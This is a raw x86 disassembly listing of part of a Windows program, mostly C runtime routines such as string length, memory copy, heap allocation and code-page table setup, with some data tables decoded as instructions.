  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
